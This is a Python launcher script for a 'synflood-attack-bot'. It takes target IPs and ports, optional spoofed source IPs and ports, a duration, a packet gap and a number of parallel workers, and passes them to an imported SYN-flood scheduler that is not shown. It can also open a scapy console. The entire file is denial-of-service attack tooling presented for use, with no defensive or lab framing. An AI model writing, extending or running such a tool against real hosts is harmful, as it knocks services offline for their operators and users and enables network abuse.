import argparse
import threading

from os import system

from SynFloodGenerator import scheduleSynFlood


def main():
    '''
    Main entry point of the synflood-attack-bot.

    Arguments:
        None
    
    Returns:
        None
    '''

    # Prepare arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('--interactive', help="use scapy interactive console", dest='interactive', action='store_true')
    parser.add_argument("-o", "--origin", help="(optional) specify source (origin) ip", required=False, nargs='+',default=None)
    parser.add_argument("-O", "--origin-port", help="(optional) specify source (origin) port", type=int, required=False, nargs='+', default=None)
    parser.add_argument("-t", "--target", help="specify target ip", required=True, nargs='+',default=None )
    parser.add_argument("-p", "--target-port", help=" specify target port", type=int, required=True, nargs='+', default=None)
    parser.add_argument("-i", "--interface", help="(optional) specify interface", required=False, default='eth0')
    parser.add_argument("-d", "--duration", help="(optional) continuously generate traffic for a set duration of time", required=False, default="5")
    parser.add_argument("-g", "--gap", help="(optional) gap (delay) between packets", type=int, required=False, default=0)
    parser.add_argument("-w", "--workers", help="(optional) number of workers to run in parallel per ip-port combination pair", type=int, required=False, default=1)
    args = parser.parse_args()

    # Use Scapy Interactive Console
    if args.interactive:
        system("scapy")
    
    if args.target is not None and args.target_port is not None:
        scheduleSynFlood(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
